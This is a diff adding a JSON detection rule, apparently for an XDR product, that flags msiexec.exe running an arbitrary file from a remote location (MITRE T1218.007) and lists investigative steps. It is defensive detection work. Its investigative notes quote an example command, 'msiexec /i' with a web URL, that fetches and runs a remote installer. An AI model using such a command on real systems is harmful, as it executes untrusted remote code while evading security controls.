@@ -1,0 +1,36 @@
+{
+  "activation_period": "14 Days",
+  "attack_tactics": [
+    "Defense Evasion (TA0005)"
+  ],
+  "attack_techniques": [
+    "System Binary Proxy Execution: Msiexec (T1218.007)"
+  ],
+  "attackers_goals": "Evading security controls and executing arbitrary files from the web.",
+  "deduplication_period": "1 Day",
+  "description": "Msiexec is the command-line utility for the Windows Installer. Adversaries may abuse msiexec.exe to proxy execution of malicious payloads from remote locations.",
+  "detection_modules": "",
+  "detector_tags": "LOLBIN Execution Analytics",
+  "investigative_actions": "Monitor the command-line arguments of msiexec.exe, For example, the command line msiexec /i http://some_domain.com/www/executable.msi can be legitimate or malicious. Check if the the URL that is encoded in the command line is trusted. Determine if the executed DLL or MSI file is known as legitimate. Confirm whether the initiating process is legitimate and if the user running it knows of its use. Note - the MSI executable can run from other LAN locations, the alert will raise on the WAN connection.",
+  "name": "Uncommon msiexec execution of an arbitrary file from a remote location",
+  "required_data": [
+    "XDR Agent"
+  ],
+  "severity": "Low",
+  "test_period": "N/A (single event)",
+  "variations": [
+    {
+      "name": "Suspicious msiexec execution on an internet-facing endpoint",
+      "severity": "Low",
+      "attack_tactics": [
+        "Defense Evasion (TA0005)"
+      ],
+      "attack_techniques": [
+        "System Binary Proxy Execution: Msiexec (T1218.007)"
+      ],
+      "description": "Suspicious msiexec execution of an arbitrary file from the web on an internet-facing server.",
+      "attackers_goals": "Evading security controls and executing arbitrary files from the web.",
+      "investigative_actions": "Monitor the command-line arguments of msiexec.exe, For example, the command line msiexec /i http://some_domain.com/www/executable.msi can be legitimate or malicious. Check if the the URL that is encoded in the command line is trusted. Determine if the executed DLL or MSI file is known as legitimate. Confirm whether the initiating process is legitimate and if the user running it knows of its use. Note - the MSI executable can run from other LAN locations, the alert will raise on the WAN connection."
+    }
+  ]
+}
